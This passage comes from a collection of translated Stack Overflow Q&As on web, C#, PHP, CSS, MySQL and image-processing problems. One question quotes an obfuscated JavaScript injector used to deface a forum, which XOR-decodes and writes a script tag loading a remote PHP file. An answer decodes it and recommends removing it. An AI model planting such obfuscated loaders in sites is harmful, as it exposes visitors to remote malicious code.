> 标签：xml, asp.net-mvc-3, firefox, caching, fusioncharts

我们在工作中使用融合图表，他们使用 xml 来设置图表的数据和样式

我们不想缓存任何数据，因为它可能很敏感。这在除 Firefox 之外的所有浏览器中都很好...

为什么只有Firefox在这样做，我们怎样才能让它停止！？？

为什么人们仍然坚持使用FLASH！？！？万事万物？！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-03T10:17:06.453

试试这个停止缓存

```
chart1.setDataURL(escape("xmlfile.xml?currTime=" + getTimeForURL()));
/**
  * getTimeForURL method returns the current time 
  * in a URL friendly format, so that it can be appended to
  * dataURL for effective non-caching.
*/
 function getTimeForURL(){
 var dt = new Date();
 var strOutput = "";
 strOutput = dt.getHours() + "_" + dt.getMinutes() + "_" + dt.getSeconds() + "_" +    dt.getMilliseconds();
  return strOutput;
 } 
```

# c# - RegisterHotKey - 如何获取表单实例？

> ID：11396815
> 
> 赞同：0
> 
> 时间：2012-07-09T14:13:49.473
> 
> 标签：c#, winforms, events, hotkeys, registerhotkey

我正在使用[这个](https://stackoverflow.com/questions/3654787/global-hotkey-in-console-application)解决方案（第一个答案）来制作热键。所以，它有事件处理方法：

```
static void HotKeyManager_HotKeyPressed(object sender, HotKeyEventArgs e)
{
  Console.WriteLine("Hit me!");
} 
```

如何在那里获取我的表单实例？我尝试使用 main 方法使表单成为类的静态字段，但我有`System.ArgumentException: Controls created on one thread cannot be parented to a control on a different thread.`如何做到这一点？

# testing - 我可以使用 GNU make 的 SHELL 变量连接到远程 shell 吗？

> ID：11396816
> 
> 赞同：0
> 
> 时间：2012-07-09T14:13:49.397
> 
> 标签：testing, gnu-make

我正在从事的项目之一使用 gnu make 进行测试。我想在没有 make 实现但有 POSIX shell 的平台上进行测试。

是否可以创建一个脚本（最好在 python 中）可以“缝合”一个远程 shell 来制作，并将其放入 make 的 SHELL 环境变量中？

如果没有，还有其他人可以想到的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T16:41:08.413

有可能的。

创建一个将命令转发到远程主机的脚本。例如：

```
#!/bin/bash
shift # remove -c argument
exec ssh remote_host "$@" 
```

并使其可执行（`chmod +x`）。

然后在 Makefile 中：

```
SHELL := './my_shell.sh'
all :
    @echo `hostname` is making $@ 
```

输出：

```
$ make
remote_host.peer1.net is making all 
```

# php - 发送 $_POST 请求到另一个没有表单的页面

> ID：11396824
> 
> 赞同：1
> 
> 时间：2012-07-09T14:14:09.880
> 
> 标签：php, post, request

我目前正忙于 PHP，并想在`POST`没有表单的情况下向另一个页面发送请求。但是你怎么做呢？我用谷歌搜索了一下，发现使用了 cURL：这是最好的方法还是没有它你能做到（容易）？

我正在考虑制作一个可以放置建议的小页面，您可以拒绝/接受它们。这些建议从（MySQL）数据库中加载，并与接受和拒绝按钮一起显示。如果单击接受，我想将参数发送到以`POST`这种方式接受的页面：

```
if(isset($_POST['name'] && isset($_POST['text'])) 
{
    // ...
} 
```

我知道这可以用 来完成`$_GET`，但我想通过`$_POST`改变来完成。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:18:14.613

使用 jQuery 进行发布请求。更多信息可以在[这里](http://api.jquery.com/jQuery.post/)找到。

一个例子是：

```
$.post('ajax/test.html', function(data) {
  $('.result').html(data);
}); 
```

如果您在实施时遇到困难，请随时进一步询问。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:19:48.047

您可以通过 Javascript (Ajax) 轻松发送帖子，请参阅 jQuery Ajax 示例。或者在 PHP 中只使用 CURL，非常好用。

如果您需要不卷曲的替代品，请使用 fopen，例如 [http://wezfurlong.org/blog/2006/nov/http-post-from-php-without-curl/](http://wezfurlong.org/blog/2006/nov/http-post-from-php-without-curl/)

另见[http://api.jquery.com/category/ajax/](http://api.jquery.com/category/ajax/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:20:35.390

有两种可接受的方法：

1.  **会话**- 而不是使用`$_POST`，使用`$_SESSION`

    *参考*：[手册](http://php.net/manual/en/features.sessions.php)

2.  **AJAX** - 您可以在没有表单的情况下发送 POST 请求。

    *参考*：[AJAX 教程](http://www.w3schools.com/ajax/default.asp)/ [jQuery AJAX](http://api.jquery.com/jQuery.ajax/)

# php - 如何在模板 PHP 页面上加载下一个图像列表。

> ID：11396825
> 
> 赞同：1
> 
> 时间：2012-07-09T14:14:09.837
> 
> 标签：php, image, gallery

我有一个正在处理的图库页面，似乎无法通过使用 GET 参数 page=2 正确加载下一组图像。

我正在使用一张带有 6 张图片以及下一个和上一个按钮的表格。但是，当我从第 1 页单击“下一步”时，它会加载图像 8 到 13，而不是商定的 7 到 12。

代码在这里：

```
<?php 
echo "<table width=\"490\" border=\"1\" align=\"center\">";
if(isset($_GET['page'])){
//Read Page, Set Start image, End image
$cur_page=abs($_GET['page']);
//if the page is page1, then set the defaults
if($cur_page==1){
    $prev_page=0;
    $next_page=2;
    $start_img=0;
    $last_img=6;
    }
    //if the page is not page1, calculate the defaults
    else{
        $prev_page=$cur_page-1;
        $next_page=$cur_page+1;
        $start_img=(($cur_page-1)*6)+1;
        $last_img=$start_img+5;
        }
}else{
//Page=1 start image=1 end image=6
$cur_page=0;
$prev_page=1;
$next_page=2;
$start_img=0;
$last_img=6;
}
//Do the sql query for the images
$sql="SELECT * FROM images LIMIT $start_img, 6";
$result = mysql_query($sql, $conn) or die(mysql_error());
//Set a counter variable to iterate the image display
$count=0;

//Begin the table that displays the images.
while ($newArray = mysql_fetch_array($result)) {
$count++;
//Print the odd-numbered column first
if($count%2==1){
    echo "<tr><td width=\"50%\"><a href=\"$newArray[Pic_Address]\">$newArray[Pic_Address]</a></td>";
//Print the even-numbered column next
}else{
    echo "<td width=\"50%\"><a href=\"$newArray[Pic_Address]\">$newArray[Pic_Address]</a></td></tr>";
}
}
//print the next and previous Links
echo "<tr>";
if($prev_page==0){echo "<td align=\"center\">Prev</td>";}else{echo "<td align=\"center\"><a href=\"index.php?page=$prev_page\">Prev</a></td>";};
echo "<td align=\"center\"><a href=\"index.php?page=$next_page\">Next</a></td>";

echo "</tr>
</table>";

//Printscreen to test the page-load variables.

echo "  <p align=\"center\">
    current page=$cur_page <br>
    prev_page=$prev_page <br>
    next_page=$next_page <br>
    start_img=$start_img <br>
    last_img=$last_img <br>
    </p>
    ";
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:33:18.833

问题出在以下几行：

```
$start_img=0;
$last_img=6; 
```

&

```
$start_img=(($cur_page-1)*6)+1;
$last_img=$start_img+5; 
```

这些行，当 page=1 时，将从`ID 0`to加载图像`ID 6`，总共 7 个图像，当 page=2 时，代码将导致`$statr_img = ((2-1)*6)+1`=`7`并且`ID 7`实际上将是第 8 个图像，因为我们从 0 开始计数。同样，`$last_img = 7+5`=`12`和再次`ID 12`是第 13 张图。

**更新：**

这是更新的完整代码。不需要 if/else 。当然，您需要清理 $_GET。

```
$cur_page = $_GET["page"];
$prev_page=$cur_page-1;
$next_page=$cur_page+1;
$start_img=(($cur_page-1)*6);
$last_img=$start_img+5; 
```

**上述代码中 Page =1,2,3（$cur_page 为 1 或 2 或 3）的**
结果：Page=1，结果：

```
$prev_page = 1-0 = 0    
$next _page = 1+1 = 2
$start_img = ((1-1)*6) = 0*6 = 0
$last_img = 0+5 = 5 
```

页=2，结果：

```
$prev_page = 2-0 = 1
$next _page = 2+1 = 3
$start_img = ((2-1)*6) = 1*6 = 6
$last_img = 6+5 = 11 
```

页=3，结果：

```
$prev_page = 3-0 = 2
$next _page = 3+1 = 4
$start_img = ((3-1)*6) = 2*6 = 12
$last_img = 12+5 = 17 
```

此外，`<table>`强烈建议不要使用 for 布局。请查看 CSS 和 DIV。查看此代码以在 CSS 中暗示相同的设计。

```
//continued from above $var calculating code + your MySql code

//Set a counter variable to iterate the image display
$count=0;

while ($newArray = mysql_fetch_array($result)) {
    $count++;
    echo "<div id=\"table\">\r\n";
    // Print the odd-numbered column first
    // if ID is 0,2,4 then Images are 1,3,5 OR odd
    if($count%2==0){
        echo "<div id=\"row\">\r\n<div class=\"cell\">\r\n<a href=\"$newArray[Pic_Address]\">$newArray[Pic_Address]</a></div><!--//cell-->\r\n";
    } else { // IDs are 1,3,5 OR Images are 2,4,6 OR even
        echo "<div class=\"cell\"\r\n><a href=\"$newArray[Pic_Address]\">$newArray[Pic_Address]</a></div><!--//cell-->\r\n</div><!--//row-->\r\n";
    } //else ends
 // while ends

//print the next and previous Links
echo "<div id=\"links\">\r\n";

if($prev_page != 0)
    echo "<a href=\"index.php?page=$prev_page\">";
echo "Prev"
if($prev_page != 0)
        echo "</a>\r\n";
echo "<a href=\"index.php?page=".$next_page."\">Next</a>\r\n";
echo "</div><!--//links-->\r\n"

echo "</div><!--//table-->\r\n" 
```

所以，现在你的页面结构是这样的：

```
+----------------table-----------------+
| +---------------row----------------+ |
| | +----cell------+------cell-----+ | |
| | |    img       |     img       | | |
| | +--------------+---------------+ | |
| +---------------row----------------+ |
| | +----cell------+------cell-----+ | |
| | |    img       |     img       | | |
| | +--------------+---------------+ | |
| +---------------row----------------+ |
| | +----cell------+------cell-----+ | |
| | |    img       |     img       | | |
| | +--------------+---------------+ | |
| +----------------------------------+ |
| +--------------links---------------+ |
| |    Prev                Next      | |
| +----------------------------------+ |
+--------------------------------------+ 
```

当然，您需要检查`Float`每个`Div`. 我会把它留给你[（Google Css Float）](https://www.google.co.in/search?sourceid=chrome&ie=UTF-8&q=css+float)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:35:54.773

第一个图像被索引为 0 而不是 1。

```
if($cur_page==1){ 
   $prev_page=0; 
   $next_page=2; 
   $start_img=0; 
   $last_img=5; 
} 
//if the page is not page1, calculate the defaults 
else{
    $prev_page=$cur_page-1; 
    $next_page=$cur_page+1; 
    $start_img=($cur_page-1)*6; 
    $last_img=$start_img+5; 
} 
```

start_img 不应加 1。

此外，您不需要 2 个 else 条件，因为只有一个会满足。

# objective-c - 在 Xcode 中调试时如何查看值？

> ID：11396826
> 
> 赞同：0
> 
> 时间：2012-07-09T14:14:23.510
> 
> 标签：objective-c, debugging, sparrow-framework

我正在尝试查看 myImage.height 的值在 Xcode 的调试模式下是什么，我在这一行有一个断点...

```
float s=myImage.height/cos(30*M_PI/180)/2; 
```

一切运行良好并到达那条线，在调试面板中我可以看到 myImage（我的 Image 是 Sparrow 框架 SPImage 对象），但我看不到任何类变量的任何值。

这实际上是我第一次在 xcode 中使用断点/调试面板，所以我可能只是没有做正确的事情。

我也试过

```
NSLog(@"myImage height: %f",myImage.height); 
```

但我也看不到输出面板中的输出。

我来自 AS3 背景，你会看到...

myImage.height 以及它在 Flash 调试面板中右侧的值，所以我在 Xcode 中寻找相同的东西。我是否必须以不同的模式运行它，或者是否有另一个面板要打开或什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:23:12.190

在控制台区域，您可以显示 2 个不同的“部分”，一个是范围内的变量，另一个是实际输出的控制台。在堆栈区域中，您可以看到范围内的所有变量。

您还可以将鼠标悬停*在代码*中的任何变量上，然后单击小披露箭头并选择“打印描述”以将其放入控制台。（控制台也是 NSLog 的地方）。

看看这张照片：

![Xcode 调试](../Images/9fd1838b41384c65af90d255789bef59.png)

然后这个： ![在此处输入图像描述](../Images/e551082ba6b128c17e63abb5d2755b99.png)

请注意，您还可以从变量区域“打印描述”：

![从变量区域打印描述](../Images/a81f26e4e29c1c3329ad793ed592027f.png)

**在此处编辑**有关悬停访问值的更多详细信息：单击变量名称，然后将鼠标向右移动，应该会弹出一个黄色条，其中包含有关实例的信息。这与小蓝色箭头不同，即使在不调试时也可用。

![悬停访问运行时值](../Images/7740552bdbcebd7ead433fef18c5ad76.png) ![在此处输入图像描述](../Images/acffdd57cb27cafb47ba3e11164f5718.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:19:56.573

如果有任何输出，它在底部面板中。底部面板右上角有三个图标，每个图标显示不同的数据视图。尝试所有三个。如果您看不到底部面板，您可以使用 XCode 窗口右上角“查看”一词上方的分段控件中的中间按钮显示它。

# c# - 同步异步调用的方法？

> ID：11396827
> 
> 赞同：1
> 
> 时间：2012-07-09T14:14:40.520
> 
> 标签：c#, asynchronous, synchronization, method-invocation

假设您在 UI 线程上*异步调用方法。*

和

```
UIDispatcher.BeginInvoke( new Action(_insert), DispatcherPriority.Normal, new object[] { } ) 
```

你正在调用。从现在开始，运行时环境决定何时执行该方法，而程序继续其“正常”执行路径。

我现在想知道是否有任何机制可以在这些异步执行的方法返回时同步它们？似乎存在与使用多线程时几乎相同的问题。

但是在被认为是线程之前已经异步调用的返回方法吗？似乎并非如此，因为通常的同步工作像

```
lock (someObject) { //... } 
```

或使用专用锁似乎不起作用。

**附录：**

我出现这个问题的实际情况如下：

*异步*调用的方法调用`return`静态类的方法作为其最后一条语句。在此`return`方法中，必须同步常用资源（列表）。考虑以下（类似概述的）代码片段来举例说明：

```
// A simple method that gets invoked asynchronously
public void _insert () {

    // do some code

    StaticClass.Returned();
}

public static StaticClass {

   //...

   public static void Returned () {

        // use a shared resource !
   }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T15:19:07.700

使用 .NET 的异步模式 a`BackgroundWorker`或 a`ManualResetEvent`

[http://msdn.microsoft.com/en-us/library/ms228969.aspx](http://msdn.microsoft.com/en-us/library/ms228969.aspx)

# c# - 如何循环面板内的所有复选框控件（在任何级别）？

> ID：11396828
> 
> 赞同：3
> 
> 时间：2012-07-09T14:14:42.970
> 
> 标签：c#, .net, user-controls

例子 ：

```
foreach (CheckBox chb in myPanel.Controls.OfType<CheckBox>().Where(p => p.Checked))) 
```

仅循环第一级复选框。如果我有二级复选框怎么办？就像在另一个 HtmlGenericControl 内部（也就是说，在一级，在 myPanel 内部）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:40:45.970

[https://stackoverflow.com/a/253962/232574](https://stackoverflow.com/a/253962/232574)

（如何将此问题设为“链接”问题？）

编辑：那是自动发生的吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T14:25:53.033

使用递归方法。将 myPanel 移动到方法参数并在 foreach 循环中添加一个调用，该调用将调用相同的方法，并且 myPanel 参数获取复选框。

# python - 使用 Python 将 OpenCV BoundingRect 转换为 NumPy 数组

> ID：11396830
> 
> 赞同：4
> 
> 时间：2012-07-09T14:14:51.330
> 
> 标签：python, opencv, numpy

在 OpenCV 中，调用 cv2.findContours 后，我得到了一个轮廓数组。

```
contours, hierarchy = cv2.findContours(image, cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE) 
```

我想使用 cv2.boundingRect 给我一个定义轮廓的矩形，因为轮廓可能很复杂。

```
for contour in contours:
   boundRect = cv2.boundingRect(contour) 
```

但是，这给了我一个 BoundingRect 对象，其形式为 (x, y, width, height)。是否有一种标准方法可以将其转换为具有已提供辅助函数的标准 NumPy 数组，还是我需要手动构建它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:43:54.213

是的，您必须手动构建这样的数组。

可能是，您可以执行以下操作：

```
>>> a = np.empty((0,4))
>>> for con in cont:
        rect = np.array(cv2.boundingRect(con)).reshape(1,4)
        a = np.append(a,rect,0) 
```

就我而言，final`a`的形状为`(166,4)`.

或者您可以使用任何 Numpy 方法来执行此操作。

# android - Widget 的 IntentService 需要访问其他类的变量——如何创建这个测试条件？

> ID：11396836
> 
> 赞同：0
> 
> 时间：2012-07-09T14:15:11.550
> 
> 标签：android, classloader, widget

我已经定义了一个带有按钮的小部件，等待用户按下“确定”。一旦按下按钮，它就会触发 IntentService `ExecuteButton`。

这将 `ExecuteButton`访问`status`DataClass 的变量。

如果在`DataClass`小部件等待用户按 OK 时 Android 系统已卸载 会发生什么？在用户按下 OK 之前，这可能需要几个小时 - 确定到那时应该卸载 DataClass。

为了测试这一点，我需要卸载`DataClass`并查看它是否正确重新加载。

有没有办法强制卸载 Android 中的类（重启设备除外？）

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T16:49:19.153

> 如果在小部件等待用户按 OK 时 Android 系统已卸载 DataClass 会发生什么？在用户按下 OK 之前，这可能需要几个小时 - 确定到那时应该卸载 DataClass。

Android 不会卸载类。它会终止您的进程。所以，要么一切都在那里，要么什么都没有。

# javascript - 重现 BingPreview JavaScript 错误

> ID：11396839
> 
> 赞同：4
> 
> 时间：2012-07-09T14:15:17.117
> 
> 标签：javascript, web-crawler, bing, bots

我有一个从 BingPreview/1.0b* 获得访问的网站，这可能是 Bing 的机器人。

我收到一个错误，看起来它找不到我很确定应该存在的 DOM 元素。我没有从任何其他浏览器（在所有主要浏览器中测试）或机器人（尽管没有错误不一定能证明什么）收到错误。

我最可能的解释是它在文档完全加载之前执行 JavaScript，但我不知道如何重现 BingPreview 机器人访问。

**如何重现 BingPreview 访问/JavaScript 错误？**

* 完整的 UA 字符串是：`Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b`

注意：访问发生在 3 天前，我能找到的关于 BingPreview 的所有信息似乎都不再公开（死链接等）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-13T12:20:14.440

首先，正如您所推测的，用户代理是某种 Bing 机器人。有类似[这样](https://webmasters.stackexchange.com/questions/27498/bingpreview-user-agent)的问题表明微软一直在为他们的搜索结果测试某种页面预览，类似于谷歌的。

因为最有可能导致错误的是他们测试和他们对机器人（机器人的 javascript 引擎）的实现，所以您也很可能无法重现它。

您肯定可以做的是[在开发控制台](http://googlesystem.blogspot.ch/2011/12/changing-user-agent-new-google-chrome.html)中的 Chrome 中将您的用户代理字符串设置为 Bing Bot UA，然后查看是否发生了什么，因为您拥有相同的用户代理，并且从 UA 看起来，相同的引擎（Webkit ）。Bot 很可能不会发生任何事情，因为如果那里有问题，那就是他们在您的网站上进行未公开的测试。

**编辑**

在 webmasterworld上也有[这篇文章](http://www.webmasterworld.com/search_engine_spiders/4410107.htm)，暗示这实际上是某种预览功能，在 bing 结果页面上也可以看到，但是以随机方式出现的。我无法确认，对我来说，必应看起来和往常一样，没有预览。

**第二次编辑**

而微软自己似乎[也不太热衷于回复](http://www.bing.com/community/webmaster/f/12248/p/675468/9680051.aspx)

# html - 更改 ul 项目的 CSS 字体颜色

> ID：11396840
> 
> 赞同：0
> 
> 时间：2012-07-09T14:15:28.633
> 
> 标签：html, css

我有一个这样的菜单：

```
<ul class="ipro_menu">

    <li><a href="/">Home</a></li>
    <li class="active-parent"><a href="/menu-item-1/">Menu Item 1</a> 

        <ul class="sub-menu">
            <li><a href="/subitem-1/">Subitem 1</a></li>
            <li class="active"><a href="/subitem-2/">Subitem 2</a></li>
        </ul>

    </li>
    <li><a href="/menu-item-2/">Menu Item 2</a></li>

</ul> 
```

当前页面自动获取类`active`，如果它在主 ul（子菜单）下的 ul 中，则主 ul 元素将获取类`active-parent`。

因此，在上面的示例中，我们将查看“Subitem 2”页面，因此“Menu Item 1”被赋予了 class `active-parent`。

我正在尝试更改`active-parent`ONLY- 不是所有子菜单元素的字体颜色。这是我所拥有的：

```
ul.ipro_menu li.active-parent a {
color: #FF0000;
} 
```

问题在于，这不仅改变了`active-parent`元素，还改变了子菜单中的所有 li。

如何将其更改为仅更改标记的特定元素的字体颜色`active-parent`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:18:40.473

CSS 会出现这种行为。为子元素覆盖该样式的唯一方法是为这些元素使用单独的（更具体的）样式：

```
ul.ipro_menu li.active-parent ul.sub-menu li a {
    color:#000;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:25:53.020

使用直接子选择器：

```
ul.ipro_menu li.active-parent > a {
  color: #FF0000;
} 
```

这只会影响 li 元素的直接后代。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-09T14:19:22.800

尝试将 active-parent 类放在 HREF 上：

[http://jsfiddle.net/RAkuc/](http://jsfiddle.net/RAkuc/)

```
<ul class="ipro_menu">

<li><a href="/">Home</a></li>
<li><a class="active-parent" href="/menu-item-1/">Menu Item 1</a> 

<ul class="sub-menu">
<li><a href="/subitem-1/">Subitem 1</a></li>
<li class="active"><a href="/subitem-2/">Subitem 2</a></li>
</ul>

</li>
<li><a href="/menu-item-2/">Menu Item 2</a></li>

</ul> ​

ul.ipro_menu a.active-parent  {
color: #FF0000;
}​ 
```

# c# - 用于创建新调制解调器的 API

> ID：11396845
> 
> 赞同：0
> 
> 时间：2012-07-09T14:15:45.820
> 
> 标签：c#, .net, c, windows, winapi

Windows 中是否有任何 API 可以执行以下步骤（创建新调制解调器）。

控制面板->电话和调制解调器选项->调制解调器（选项卡）->添加->标记不检测我的设备->从列表中选择（两台计算机之间的通信电缆）->从lsit中选择端口->完成。

如何以编程方式执行此操作。请为此参考一些 API。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:35:02.620

您可能可以使用 Windows 中的 TAPI（电话 API）做一些事情。

看看这里（对于一些特定的调制解调器 API）：

*   [http://msdn.microsoft.com/en-us/library/windows/desktop/ms734853(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms734853(v=vs.85).aspx)

在这里（对于所有可用的 TAPI 接口）：

*   [http://msdn.microsoft.com/en-us/library/windows/desktop/ms734273(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms734273(v=vs.85).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-28T06:04:20.530

看看这个页面： http: [//support2.microsoft.com/default.aspx ?scid=kb;EN-US;Q304294](http://support2.microsoft.com/default.aspx?scid=kb;EN-US;Q304294)

我遇到了和你一样的问题，我在win7 64位系统上成功解决了这个问题。您应该从此页面下载源文件并使用 WDK (我使用 WDK7.1) 进行编译。注意，原源是DDK编译的，在WDK下会链接失败。所以你应该在文件'SOURCES'中添加一行：

```
 USE_MSVCRT = 1 
```

构建通过后，您将获得一个可执行文件“mdminst.exe”。然后你可以通过 CLI 安装任何你想要的调制解调器：

```
C:\> mdminst <modem-inf-file> <COM port> <HardwareID> 
```

前任。要在 COM1 上安装标准 33600bps 调制解调器，命令是：

```
mdminst c:\windows\inf\mdmgen.inf COM1 mdmgen336 
```

# c# - 从另一个线程（在另一个类中）将数据添加到数据网格

> ID：11396848
> 
> 赞同：0
> 
> 时间：2012-07-09T14:15:48.750
> 
> 标签：c#, multithreading

我有一个问题已经让我发疯了好几天。我已经尝试了很多来自这个网站和许多其他网站的教程和代码片段。我正在构建一个 P2P 应用程序，但在访问主线程时遇到问题。
这是我的应用程序的简单流程：
1\. 显示 frmMain - 用户单击登录按钮
2\. 显示 frmlogin - 用户输入他的姓名
3\. “登录”后 - 创建两个线程（threadTCPlistener 和 threadUDPlistener）
4\. frmDataGrid显示

```
Server listen = new Server();
Thread listeningUDPThread = new Thread(new ThreadStart(listen.startUDPServer));
listeningUDPThread.IsBackground = true;
listeningUDPThread.Start();
Thread listeningTCPThread = new Thread(new ThreadStart(listen.startTCPServer));
listeningTCPThread.IsBackground = true;
listeningTCPThread.Start();
frmDataGrid dg = new frmDataGrid();
dg.Show(); 
```

5.Threads 在一个名为“Server”的单独类中工作。他们在那里等待传入的连接，当 TCP 线程接受连接时，它开始接收文件。收到文件后，我想更改 frmDataGrid 中的 GUI 以向网格视图添加新行。我做了这样的事情：

```
public void downloadFile()
{
     //--receiving of the file--
     frmDataGrid fdg = new frmDataGrid();
     //filename is the name of received file, and 100's are just for testing (for now).    
     fdg.verifyUIRequest(fileName, 100, 100);
} 
```

我正在从 frmDataGrid VerifyUIRequest 调用一个方法，如下所示：

```
 public void verifyUIRequest(string filename, int done, int percent)
     {
     if (dgvDown.InvokeRequired)
         {
         dgvDown.Invoke((MethodInvoker)delegate { updateDownDgv(filename, done, percent);  });
         }
     else
     {
         updateDownDgv(filename, done, percent);
     } 
```

在此之后，主线程应该调用“updateDownDgv”方法，但问题是我的数据网格没有发生任何事情。这是更新的代码：

```
public void updateDownDgv(string filename, int done, int percent)
{
foreach (DataGridViewRow r in dgvDown.Rows)
{
        if ((string)r.Cells[0].Value == filename)
                {
                    r.Cells[1].Value = done;
                    r.Cells[2].Value = percent;
                }
                dgvDown.Invalidate();
                return;
 }
 DataTable tab = (DataTable)dgvDown.DataSource;
 DataRow row =  tab.NewRow();
 row[0] = filename;
 row[1] = percent;
 row[2] = done;
 //MessageBox.Show(done.ToString());
 tab.Rows.Add(row);
 dgvDown.DataSource = null;
 dgvDown.DataSource = tab;
 } 
```

我试过用一些 lambda 表达式来做这个 withh begin invoke，但没有成功。任何人都可以请我指出错误或以其他方式提供帮助吗？我真的很感激。PS这是我的第一篇文章，所以如果格式不好，我提前道歉。:)

编辑：所以问题显然出在实例上，所以我做了这样的事情：从我创建 frmDataGrid 类的实例的服务器类，我现在称它为接受 3 个参数的构造函数。frmDataGrid fdg = new frmDataGrid(fileName, 100, 100); 在那个构造函数中，在 frmDataGrid 中，我调用了 verifyUIRequest。但是随后发生了另一个错误，我似乎无法弄清楚。它停在

```
if (dgvDown.InvokeRequired)
{... 
```

错误如下：“对象引用未设置为对象的实例”，即NullReferenceException。可能是什么错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:22:08.903

您正在您的方法中创建一个全新的数据网格`downloadFile`。您应该更新主网格并从您的线程方法调用方法，而不是创建一个在`downloadFile`方法退出时掉在地板上的新网格。

# javascript - Javascript编码？var enkripsi

> ID：11396854
> 
> 赞同：0
> 
> 时间：2012-07-09T14:15:55.803
> 
> 标签：javascript, encryption

有人使用奇怪的脚本来破坏我的论坛，我跟踪它并找到了 javascript，但它是“编码的”，有人可以帮助我吗？

这里是：

```
var enkripsi="'1Aqapkrv'02v
    {
    rg'1F'05vgzv-hctcqapkrv'05'02qpa'1F'05cqw,rjr'05'1G'1A-qapkrv'1G";
    teks="";
    teksasli="";
    var panjang;
    panjang=enkripsi.length;
    for(i=0;
    i<panjang;
    i++)
        {
        teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2)
    }
    teksasli=unescape(teks);
    document.write(teksasli); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T14:18:02.107

它将以下标签插入到您的输出中：

```
<script type='text/javascript' src='***.php'></script> 
```

只需在一些 JavaScript 解释器中运行代码，然后`document.write()`用类似的东西替换最后的`console.log()`，您就可以看到输出。

我猜这是某种蠕虫，建议`***.php`从系统中删除此代码和包含的文件。另外检查一下，这是否是对您的代码的唯一修改！

# mysql - Mysql 远程连接

> ID：11396855
> 
> 赞同：0
> 
> 时间：2012-07-09T14:16:02.340
> 
> 标签：mysql, remote-access

我在运行托管在另一台不是 Web 托管服务器的服务器上的 MySQL 服务器时遇到问题。目前我的网络服务器运行在 godaddy 的免费 linux 主机上。他们确实提供免费的 MySQL 数据库，但如果不为升级的托管计划付费，您将无法远程连接（Sequel Pro OSX 程序）。所以暂时，我将把数据库托管在我家的服务器上（XAMPP）。好吧，每当我尝试使用 PHP 命令 mysql_connect() 连接到数据库时，都会出现错误：

```
"Warning: mysql_connect() [function.mysql-connect]: Lost connection to MySQL server at 'reading initial communication packet', system error: 110" 
```

在它说 113 之前（我相信）。

任何人，我绑定使用“绑定地址”并将其从 12.0.0.1 更改为我的 LAN IP。它没有用，或者我做得不对。所以，我能得到的任何帮助都会很棒。

仅供参考，我可以使用 Sequel Pro 从我的网络内部远程连接到数据库。但是godaddy服务器无法连接。端口也是开放的，所以这不是问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T15:04:06.277

出自 Godaddy 支持人员的口中，“我们的共享托管计划不让您能够连接到外部数据库。如果您希望拥有这种能力，您需要研究我们的服务器托管选项之一。”

所以，我的配置是正确的，只是godaddy被屏蔽了。瘸！感谢大家的帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:17:53.160

如果您将数据库托管到本地本地计算机，您还应该将路由器“ ***xxx*** ”TCP 端口重定向到托管 pc 的 3306 TCP 端口。
请记住，您必须在端口“ ***xxx*** ”上连接到 WAN ip。

1.  您可以使用免费的 dns 服务（例如 dyndns）将您的互联网连接映射到一个名称（例如 yourname.dyndns.org）
2.  将路由器的端口（默认 3306）重定向到主机 PC 的 3306 TC 端口（内部）
3.  从远程电脑连接到 yourname.dydns.org:3306 或您在路由器上重定向的端口

# opengl - 在几秒钟而不是几小时内旋转数百个 JPEG

> ID：11396856
> 
> 赞同：3
> 
> 时间：2012-07-09T14:16:03.500
> 
> 标签：opengl, graphics, opencv, opencl, image-rotation

我们的计算机一次获取数百张图像，我们需要尽可能快地旋转和调整它们的大小。旋转 90、180 或 270 度。

目前我们正在使用命令行工具[GraphicsMagick](http://www.graphicsmagick.org/)来旋转图像。旋转图像 (5760*3840 ~ 22MP) 大约需要 4 到 7 秒。

以下[python代码](https://stackoverflow.com/questions/2259678/easiest-way-to-transpose-an-image-rotate-by-90-degrees-using-opencv)遗憾地给了我们相同的结果

```
import cv
img = cv.LoadImage("image.jpg")
timg = cv.CreateImage((img.height,img.width), img.depth, img.channels) # transposed image

# rotate counter-clockwise
cv.Transpose(img,timg)
cv.Flip(timg,timg,flipMode=0)
cv.SaveImage("rotated_counter_clockwise.jpg", timg) 
```

有没有更快的方法来利用显卡的力量来旋转图像？想到 OpenCL 和 OpenGL，但我们想知道性能提升是否会显着。

我们使用的硬件相当有限，因为设备应该尽可能小。

*   [英特尔凌动 D525 (1,8 Ghz)](http://ark.intel.com/products/49490/)
*   [移动 Radeon HD 5430 系列](http://www.amd.com/de/products/notebook/graphics/ati-mobility-hd-5400/Pages/hd-5430-specs.aspx)
